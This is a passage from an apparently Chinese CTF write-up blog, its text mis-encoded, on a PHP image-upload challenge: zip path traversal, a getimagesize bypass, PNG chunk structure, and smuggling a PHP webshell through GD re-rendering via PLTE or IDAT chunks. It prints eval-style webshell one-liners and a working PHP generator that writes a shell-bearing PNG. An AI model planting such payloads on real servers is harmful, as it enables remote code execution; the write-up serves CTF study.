        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">)</span> <span class="o">!==</span> <span class="k">TRUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span> <span class="p">(</span><span class="s2">&#34;éƒ½ä¸èƒ½è§£å‹å‘¢&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">echo</span> <span class="s2">&#34;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&#34;</span><span class="p">;</span>
    <span class="nv">$pos_for_zip</span> <span class="o">=</span> <span class="s2">&#34;/tmp/example/&#34;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]);</span>
    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">extractTo</span><span class="p">(</span><span class="nv">$pos_for_zip</span><span class="p">);</span>
    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">);</span>
    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">glob</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$pos_for_zip</span><span class="s2">/*&#34;</span><span class="p">);</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$first</span> <span class="o">=</span> <span class="nx">imagecreatefrompng</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
        <span class="nv">$size</span> <span class="o">=</span> <span class="nx">min</span><span class="p">(</span><span class="nx">imagesx</span><span class="p">(</span><span class="nv">$first</span><span class="p">),</span> <span class="nx">imagesy</span><span class="p">(</span><span class="nv">$first</span><span class="p">));</span>
        <span class="nv">$second</span> <span class="o">=</span> <span class="nx">imagecrop</span><span class="p">(</span><span class="nv">$first</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;x&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;width&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$final_name</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file</span><span class="p">)[</span><span class="s2">&#34;basename&#34;</span><span class="p">];</span>
            <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$second</span><span class="p">,</span> <span class="s1">&#39;example/&#39;</span><span class="o">.</span><span class="nv">$final_name</span><span class="p">);</span>
            <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$second</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$first</span><span class="p">);</span>
        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
</code></pre></div><h4 id="bypass-image-size">bypass image size</h4>
<p>ä¸Šä¼ å¤„å¯¹å›¾ç‰‡çš„å°ºå¯¸åšå‡ºäº†è¦æ±‚ï¼Œæ­¤æ—¶æœ‰ä¸€ç§æ–¹æ³•æ¥ç»•è¿‡ã€‚å°†ä¸‹åˆ—ä»£ç æ‹¼æ¥åˆ°POSTæµæœ€åå³å¯ç»•è¿‡ <code>getimagesize</code> çš„æ£€æµ‹</p>
<pre><code>#define width 1
#define height 1
</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174250.png" alt="img"  /></p>
<p>ç»è¿‡ä¸€ç•ªè°ƒè¯•ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªtxtæ–‡ä»¶å’Œä¸€ä¸ªphpæ–‡ä»¶æ‰“åŒ…ä¸€ä¸ªå‹ç¼©åŒ…ä¸Šä¼ ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æŠ“åŒ…åœ¨POSTæ•°æ®æµæœ€åæ‰‹åŠ¨åŠ ä¸Šè¿™ä¸¤è¡Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174522.png" alt="image-20210516174519255"  /></p>
<h4 id="bypass-zip">bypass zip</h4>
<p>mb_strtolowerå¯ä»¥å…¼å®¹unicodeå­—ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨unicodeå­—ç¬¦<code>Ä°</code>ï¼Œç»è¿‡<code>mb_strtolower</code>è½¬æ¢å˜æˆå°å†™å­—æ¯<code>i</code></p>
<p><a href="https://www.compart.com/en/unicode/U+1D5A8">https://www.compart.com/en/unicode/U+1D5A8</a></p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">echo</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="s1">&#39;Ä°&#39;</span><span class="p">);</span> <span class="c1">//iÌ‡
</span></code></pre></div><p>åœ¨exampleè§£å‹çš„æ—¶å€™è‡ªç„¶æ˜¯<code>../</code>ç›®å½•ç©¿è¶Šè§£å‹æˆ‘ä»¬ä¸Šä¼ çš„å‹ç¼©åŒ…</p>
<p>ç„¶åå°±æ˜¯<code>imagecreatefrompng</code>ï¼Œè¿™ä¸ªå‡½æ•°åªè¦ä½ ç¡®ç¡®å®å®æ˜¯ä¸€å¼ å›¾ç‰‡(ä¹Ÿå°±æ˜¯Windowsä¸‹æ”¹åç¼€ä¸ºpngï¼Œèƒ½æ­£å¸¸æ‰“å¼€)å°±å¯ä»¥è¿‡ï¼Œä¹‹åä»–ä½¿ç”¨<code>imagepng</code>å‡½æ•°æŠŠè¿™ä¸ªæ–‡ä»¶è¾“å‡ºåˆ°webè·¯å¾„ï¼Œä¸è¿‡é—æ†¾çš„æ˜¯ï¼Œç»è¿‡è¿™ä¸ªä¸¤ä¸ªå‡½æ•°ä¸€è¯»ä¸€è¾“å‡ºï¼Œå›¾ç‰‡å†…å®¹ä¼šå˜</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516175639.png" alt="image-20210516175636078"  /></p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé€šè¿‡Windows cmdçš„copyå‘½ä»¤ç”Ÿæˆçš„å›¾ç‰‡é©¬ï¼Œä¸é¡¶ç”¨ï¼Œå¾—æ¢é«˜çº§å¾—é©¬å„¿</p>
<p>è¿™å°±æ˜¯PHPäºŒæ¬¡æ¸²æŸ“ç»•è¿‡ã€‚åœ¨æ­¤ä¹‹å‰å…ˆæ’ä¸ªé¢„å¤‡çŸ¥è¯†ï¼Œä»‹ç»ä¸‹PNGçš„æ„é€ </p>
<h4 id="pngç»“æ„">PNGç»“æ„</h4>
<p>png æ”¯æŒä¸‰ç§å›¾åƒç±»å‹</p>
<ul>
<li>ç´¢å¼•å½©è‰²å›¾åƒ(index-color images)</li>
<li>ç°åº¦å›¾åƒ(grayscale images)</li>
<li>çœŸå½©è‰²å›¾åƒ(true-color images)</li>
</ul>
<h5 id="png-æ ‡è¯†">png æ ‡è¯†</h5>
<p>png æ ‡è¯†ä½œä¸º png å›¾ç‰‡çš„å¤´éƒ¨ï¼Œä¸ºå›ºå®šçš„ 8 å­—èŠ‚</p>
<pre><code>89 50 4E 47 OD 0A 1A 0A
</code></pre><h5 id="æ•°æ®å—">æ•°æ®å—</h5>
<p>png å®šä¹‰äº†ä¸¤ç§ç±»å‹çš„æ•°æ®å—ï¼Œä¸€ç§æ˜¯ç§°ä¸ºå…³é”®æ•°æ®å—(critical chunk)ï¼Œæ ‡å‡†çš„æ•°æ®å—; å¦ä¸€ç§å«åšè¾…åŠ©æ•°æ®å—(ancillary chunks)ï¼Œå¯é€‰çš„æ•°æ®å—ã€‚</p>
<p>å…³é”®æ•°æ®å—å®šä¹‰äº†3ä¸ªæ ‡å‡†æ•°æ®å—ï¼Œæ¯ä¸ª png æ–‡ä»¶éƒ½å¿…é¡»åŒ…å«å®ƒä»¬ã€‚3ä¸ªæ ‡å‡†æ•°æ®å—ä¸º: <code>IHDRï¼Œ IDATï¼Œ IEND</code></p>
<p>è¿™é‡Œä»‹ç»4ä¸ªï¼š</p>
<ul>
<li>
<p>æ–‡ä»¶å¤´æ•°æ®å—<code>IHDR</code>(header chunk)</p>
</li>
<li>
<p>è°ƒè‰²æ¿æ•°æ®å—<code>PLTE</code>(palette chunk)</p>
</li>
<li>
<p>å›¾åƒæ•°æ®å—<code>IDAT</code>(image data chunk)</p>
</li>
<li>
<p>å›¾åƒç»“æŸæ•°æ®<code>IEND</code>(image trailer chunk)</p>
</li>
</ul>
<p>æ¯ä¸ªæ•°æ®å—éƒ½ç”±ä¸‹è¡¨æ‰€ç¤ºçš„çš„4ä¸ªåŸŸç»„æˆã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">åç§°</th>
<th style="text-align:center">å­—èŠ‚æ•°</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Length(é•¿åº¦)</td>
<td style="text-align:center">4å­—èŠ‚</td>
<td style="text-align:center">æŒ‡å®šæ•°æ®å—ä¸­æ•°æ®åŸŸçš„é•¿åº¦ï¼Œå…¶é•¿åº¦ä¸è¶…è¿‡$(2^{31}-1)$å­—èŠ‚</td>
</tr>
<tr>
<td style="text-align:center">Chunk Type Code(æ•°æ®å—ç±»å‹ç )</td>
<td style="text-align:center">4å­—èŠ‚</td>
<td style="text-align:center">æ•°æ®å—ç±»å‹ç ç”±ASCIIå­—æ¯(A-Zå’Œa-z)ç»„æˆ</td>
</tr>
<tr>
<td style="text-align:center">Chunk Data(æ•°æ®å—å®é™…å†…å®¹)</td>
<td style="text-align:center">å¯å˜é•¿åº¦</td>
<td style="text-align:center">å­˜å‚¨æŒ‰ç…§Chunk Type CodeæŒ‡å®šçš„æ•°æ®</td>
</tr>
<tr>
<td style="text-align:center">CRC(å¾ªç¯å†—ä½™æ£€æµ‹)</td>
<td style="text-align:center">4å­—èŠ‚</td>
<td style="text-align:center">å­˜å‚¨ç”¨æ¥æ£€æµ‹æ˜¯å¦æœ‰é”™è¯¯çš„å¾ªç¯å†—ä½™ç </td>
</tr>
</tbody>
</table>
<p>å…¶ä¸­CRC(cyclic redundancy check)åŸŸä¸­çš„å€¼æ˜¯å¯¹Chunk Type CodeåŸŸå’ŒChunk DataåŸŸä¸­çš„æ•°æ®è¿›è¡Œè®¡ç®—å¾—åˆ°çš„ï¼Œå¯ä»¥çœ‹åšä¸€ç§æ ¡éªŒç </p>
<hr>
<ul>
<li>
<p>æ–‡ä»¶å¤´æ•°æ®å—<strong>IHDR</strong>(header chunk)ï¼š</p>
<p>å®ƒåŒ…å«æœ‰PNGæ–‡ä»¶ä¸­å­˜å‚¨çš„å›¾åƒæ•°æ®çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¹¶è¦ä½œä¸ºç¬¬ä¸€ä¸ªæ•°æ®å—å‡ºç°åœ¨PNGæ•°æ®æµä¸­ï¼Œè€Œä¸”ä¸€ä¸ªPNGæ•°æ®æµä¸­åªèƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶å¤´æ•°æ®å—ã€‚</p>
</li>
<li>
<p>è°ƒè‰²æ¿æ•°æ®å—<strong>PLTE</strong>(palette chunk)ï¼š</p>
<p>å®ƒåŒ…å«æœ‰ä¸ç´¢å¼•å½©è‰²å›¾åƒ((indexed-color image))ç›¸å…³çš„å½©è‰²å˜æ¢æ•°æ®ï¼Œå®ƒä»…ä¸ç´¢å¼•å½©è‰²å›¾åƒæœ‰å…³ï¼Œè€Œä¸”è¦æ”¾åœ¨å›¾åƒæ•°æ®å—(image data chunk)ä¹‹å‰ã€‚çœŸå½©è‰²çš„PNGæ•°æ®æµä¹Ÿå¯ä»¥æœ‰è°ƒè‰²æ¿æ•°æ®å—ï¼Œç›®çš„æ˜¯ä¾¿äºéçœŸå½©è‰²æ˜¾ç¤ºç¨‹åºç”¨å®ƒæ¥é‡åŒ–å›¾åƒæ•°æ®ï¼Œä»è€Œæ˜¾ç¤ºè¯¥å›¾åƒã€‚ç»“æ„å¦‚ä¸‹ï¼š</p>
</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">é¢œè‰²</th>
<th style="text-align:center">å­—èŠ‚</th>
<th style="text-align:center">æ„ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Red</td>
<td style="text-align:center">1 byte</td>
<td style="text-align:center">0 = é»‘è‰², 255 = çº¢</td>
</tr>
<tr>
<td style="text-align:center">Green</td>
<td style="text-align:center">1 byte</td>
<td style="text-align:center">0 = é»‘è‰², 255 = ç»¿è‰²</td>
</tr>
<tr>
<td style="text-align:center">Blue</td>
<td style="text-align:center">1 byte</td>
<td style="text-align:center">0 = é»‘è‰², 255 = è“è‰²</td>
</tr>
</tbody>
</table>
<pre><code>PLTEæ•°æ®å—æ˜¯å®šä¹‰å›¾åƒçš„è°ƒè‰²æ¿ä¿¡æ¯ï¼ŒPLTEå¯ä»¥åŒ…å«1~256ä¸ªè°ƒè‰²æ¿ä¿¡æ¯ï¼Œæ¯ä¸€ä¸ªè°ƒè‰²æ¿ä¿¡æ¯ç”±3ä¸ªå­—èŠ‚ç»„æˆï¼Œå› æ­¤è°ƒè‰²æ¿æ•°æ®å—æ‰€åŒ…å«çš„æœ€å¤§å­—èŠ‚æ•°ä¸º768ï¼Œè°ƒè‰²æ¿çš„é•¿åº¦åº”è¯¥æ˜¯3çš„å€æ•°ï¼Œå¦åˆ™ï¼Œè¿™å°†æ˜¯ä¸€ä¸ªéæ³•çš„è°ƒè‰²æ¿ã€‚

å¯¹äºç´¢å¼•å›¾åƒï¼Œè°ƒè‰²æ¿ä¿¡æ¯æ˜¯å¿…é¡»çš„ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²ç´¢å¼•ä»0å¼€å§‹ç¼–å·ï¼Œç„¶åæ˜¯1ã€2â€¦â€¦ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²æ•°ä¸èƒ½è¶…è¿‡è‰²æ·±ä¸­è§„å®šçš„é¢œè‰²æ•°ï¼ˆå¦‚å›¾åƒè‰²æ·±ä¸º4çš„æ—¶å€™ï¼Œè°ƒè‰²æ¿ä¸­çš„é¢œè‰²æ•°ä¸å¯ä»¥è¶…è¿‡2^4=16ï¼‰ï¼Œå¦åˆ™ï¼Œè¿™å°†å¯¼è‡´PNGå›¾åƒä¸åˆæ³•ã€‚
</code></pre>
<ul>
<li>å›¾åƒæ•°æ®å—<strong>IDAT</strong>(image data chunk)ï¼š</li>
</ul>
<p>å®ƒå­˜å‚¨å®é™…çš„æ•°æ®ï¼Œåœ¨æ•°æ®æµä¸­å¯åŒ…å«å¤šä¸ªè¿ç»­é¡ºåºçš„å›¾åƒæ•°æ®å—ã€‚</p>
<p>IDATå­˜æ”¾ç€å›¾åƒçœŸæ­£çš„æ•°æ®ä¿¡æ¯</p>
<ul>
<li>
<p>å›¾åƒç»“æŸæ•°æ®<strong>IEND</strong>(image trailer chunk)ï¼š</p>
<p>å®ƒç”¨æ¥æ ‡è®°PNGæ–‡ä»¶æˆ–è€…æ•°æ®æµå·²ç»ç»“æŸï¼Œå¹¶ä¸”å¿…é¡»è¦æ”¾åœ¨æ–‡ä»¶çš„å°¾éƒ¨ã€‚</p>
<pre><code>00 00 00 00 49 45 4E 44 AE 42 60 82
</code></pre><pre><code>	
  ç”±äºæ•°æ®å—ç»“æ„çš„å®šä¹‰ï¼ŒIENDæ•°æ®å—çš„é•¿åº¦æ€»æ˜¯0ï¼ˆ00 00 00 00ï¼Œé™¤éäººä¸ºåŠ å…¥ä¿¡æ¯ï¼‰ï¼Œæ•°æ®æ ‡è¯†æ€»æ˜¯IENDï¼ˆ49 45 4E 44ï¼‰ï¼Œå› æ­¤ï¼ŒCRCç ä¹Ÿæ€»æ˜¯AE 42 60 82



</code></pre></li>
</ul>
<h4 id="å†™æ€è·¯">å†™ğŸæ€è·¯</h4>
<p>äº†è§£äº†pngç»“æ„ä¹‹åï¼Œæˆ‘ä»¬å¤§æ¦‚æœ‰ä¸¤ç§æ€è·¯æ„é€ webshell</p>
<ol>
<li>
<p>å‘<strong>PLTE</strong>æ’å…¥phpä»£ç </p>
<p><a href="https://github.com/hxer/imagecreatefrom-/tree/master/png/analysis">https://github.com/hxer/imagecreatefrom-/tree/master/png/analysis</a></p>
<blockquote>
<p>åˆ†æåº•å±‚æºç å¯çŸ¥ï¼Œ png signature æ˜¯ä¸å¯èƒ½æ’å…¥ php ä»£ç çš„ï¼› IHDR å­˜å‚¨çš„æ˜¯ png çš„å›¾ç‰‡ä¿¡æ¯ï¼Œæœ‰å›ºå®šçš„é•¿åº¦å’Œæ ¼å¼ï¼Œç¨‹åºä¼šæå–å›¾ç‰‡ä¿¡æ¯æ•°æ®è¿›è¡ŒéªŒè¯ï¼Œå¾ˆéš¾æ’å…¥ php ä»£ç ï¼›è€Œ PLTE ä¸»è¦è¿›è¡Œäº† CRC æ ¡éªŒå’Œé¢œè‰²æ•°åˆæ³•æ€§æ ¡éªŒç­‰ç®€å•çš„æ ¡éªŒï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½åœ¨ data åŸŸæ’å…¥ php ä»£ç ã€‚</p>
<p>ä»å¯¹ PLTE chunk éªŒè¯çš„åˆ†æå¯çŸ¥ï¼Œ å½“åŸå§‹å›¾ç‰‡æ ¼å¼ç»™ç´¢å¼•å›¾ç‰‡æ—¶ï¼ŒPLTE æ•°æ®å—åœ¨æ»¡è¶³ png æ ¼å¼è§„èŒƒçš„æƒ…å†µä¸‹ï¼Œç¨‹åºè¿˜ä¼šè¿›è¡Œ CRC æ ¡éªŒå’Œé•¿åº¦åˆæ³•æ€§éªŒè¯ã€‚å› æ­¤ï¼Œè¦å°† PHP ä»£ç å†™å…¥ PLTE æ•°æ®å—ï¼Œä¸ä»…è¦ä¿®æ”¹ data åŸŸçš„å†…å®¹ä¸ºphpä»£ç ï¼Œç„¶åä¿®æ”¹ CRC ä¸ºæ­£ç¡®çš„ CRC æ ¡éªŒå€¼ï¼Œå½“è¦å¡«å……çš„ä»£ç è¿‡é•¿æ—¶ï¼Œå¯ä»¥æ”¹å˜ length åŸŸçš„æ•°å€¼ï¼Œæ»¡è¶³ length ä¸º3çš„å€æ•°ï¼Œ ä¸”é¢œè‰²æ•°ä¸è¶…è¿‡è‰²æ·±ä¸­è§„å®šçš„é¢œè‰²æ•°ã€‚ä¾‹å¦‚: IHDR æ•°æ®å—ä¸­ Bit depth ä¸º 08, åˆ™æœ€å¤§çš„é¢œè‰²æ•°ä¸º 2^8=256, é‚£ä¹ˆ PLTE æ•°æ®å— data çš„é•¿åº¦ä¸è¶…è¿‡ 3*256=0x300ã€‚ è¿™ä¸ªé•¿åº¦å¯¹å†™å…¥ php ä¸€å¥è¯æœ¨é©¬æˆ–è€…åˆ›å»ºåé—¨æ–‡ä»¶è¶³å¤Ÿäº†ã€‚</p>
</blockquote>
<p>é€šè¿‡æ–‡ç« çš„expæ„é€ çš„webshellï¼Œèƒ½è¿‡åªæœ‰<code>imagecreatefrompng</code>å’Œ<code>imagepng</code>çš„ã€‚</p>
<p>ä½†æ˜¯ç»è¿‡é¢˜ç›®<code>imagecrop</code>è¿™ç§è£å‰ªï¼Œä¼šè¢«æœ‰è§„å¾‹çš„åæ‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210522224140.png" alt="image-20210522224138197"  /></p>
<p>è§£å†³æ–¹æ¡ˆæ˜¯å¯ä»¥ç¡¬è°ƒï¼š</p>
<pre><code>*/$&lt;?=_GET/**/[fghijk;/*(/*rstuvw0])*/e$%^val/*+//
//å°±é—®è¿™æ˜¯äººèƒ½è°ƒå‡ºæ¥çš„ä¹ˆï¼Ÿ&lt;?=eval($_GET[0]);
</code></pre></li>
<li>
<p>å‘<strong>IDAT</strong>æ’å…¥phpä»£ç </p>
<p>åŸç†å‰–æï¼šhttps://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</p>
<p>expï¼šhttps://github.com/huntergregal/PNG-IDAT-Payload-Generator/</p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨phpç‰ˆæœ¬çš„expï¼š</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$p</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span>
           <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span>
           <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span>
           <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span>
           <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
           <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span>
           <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span>
           <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">);</span>
   
<span class="nv">$img</span> <span class="o">=</span> <span class="nx">imagecreatetruecolor</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
   
<span class="k">for</span> <span class="p">(</span><span class="nv">$y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$y</span> <span class="o">&lt;</span> <span class="nx">sizeof</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span> <span class="nv">$y</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
   <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="p">];</span>
   <span class="nv">$g</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
   <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$p</span><span class="p">[</span><span class="nv">$y</span><span class="o">+</span><span class="mi">2</span><span class="p">];</span>
   <span class="nv">$color</span> <span class="o">=</span> <span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nv">$r</span><span class="p">,</span> <span class="nv">$g</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span>
   <span class="nx">imagesetpixel</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span> <span class="nx">round</span><span class="p">(</span><span class="nv">$y</span> <span class="o">/</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$color</span><span class="p">);</span>
<span class="p">}</span>
   
<span class="nx">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="s1">&#39;wh1sper.php&#39;</span><span class="p">);</span><span class="c1">//è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„
</span><span class="c1"></span><span class="cm">/* æœ¨é©¬å†…å®¹
</span><span class="cm">&lt;?$_GET[0]($_POST[1]);?&gt;
</span><span class="cm"> */</span>
</code></pre></div><p>ç½‘ä¸Šçš„wpå¤§å¤šéƒ½ç”¨çš„ç¬¬äºŒç§æ–¹æ³•ï¼Œç”¨pythonçš„expã€‚ç„¶åæ˜¯æŠŠ<code>$_GET[0]</code>æ”¹æˆäº†<code>EVAL</code>ï¼Œç„¶åéœ€è¦æŒ‰ç…§ç®—æ³•è®¡ç®—ä¸€ä¸‹crc</p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/116885083">https://blog.csdn.net/miuzzx/article/details/116885083</a></p>
<p><a href="https://lemonprefect.cn/zh-cn/posts/7c083fa1#imagecreatefrompng-bypass">https://lemonprefect.cn/zh-cn/posts/7c083fa1#imagecreatefrompng-bypass</a></p>
<blockquote>
<p>ä½¿ç”¨å‚è€ƒçš„ Repo ä¸­çš„ä»£ç å¯ä»¥ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º 25 çš„ä»»æ„ PHP payload çš„æ­£æ–¹å½¢å›¾ç‰‡ï¼Œåªéœ€è¦å°†è‡ªå¸¦çš„ payload ç»è¿‡ Raw Deflate ä¹‹åå† Inflate å³å¯</p>
</blockquote>
</li>
</ol>
<h4 id="é¢˜å¤–è¯">é¢˜å¤–è¯</h4>
<p>è¿™ä¸ªå§¿åŠ¿å¹¶ä¸æ˜¯æ–°ä¸œè¥¿ï¼Œåœ¨upload-labs17å’ŒDDCTFéƒ½å‡ºç°è¿‡ï¼Œæ²¡åšå‡ºæ¥è¿˜æ˜¯è¯´æ˜é¢˜åˆ·å°‘äº†</p>
<p>å¦å¤–è¿˜æœ‰å…¶ä»–å›¾ç‰‡çš„äºŒæ¬¡æ¸²æŸ“å…·ä½“å¯ä»¥çœ‹çœ‹ï¼šhttps://www.sqlsec.com/2020/10/upload.html#toc-heading-17</p>
<h3 id="æŒ–å‘">æŒ–å‘</h3>
<p>è¿™æ¬¡å›½èµ›é¢˜ç›®é¡¶å•Šï¼Œåé¢çš„æ¯é“é¢˜éƒ½è›®ä¸é”™çš„ï¼Œå¯æƒœä¸çŸ¥é“æœ‰æ²¡æœ‰æœºä¼šäº†ï¼Œç­‰ä»¥åæœ‰ç¼˜å°±å†²äº†ä»–</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">æ–‡ä»¶åŒ…å«</a>
        
            <a href="/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">æ— åˆ—åæ³¨å…¥</a>
        
            <a href="/tags/reflectionmethod/">ReflectionMethod</a>
        
            <a href="/tags/imagecreatefrom/">imagecreatefrom</a>
        
            <a href="/tags/session.upload_progress/">session.upload_progress</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>

    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3&#43;Aro6EYUG4&#43;cU&#43;KJWu/X"crossorigin="anonymous"
            ><script 
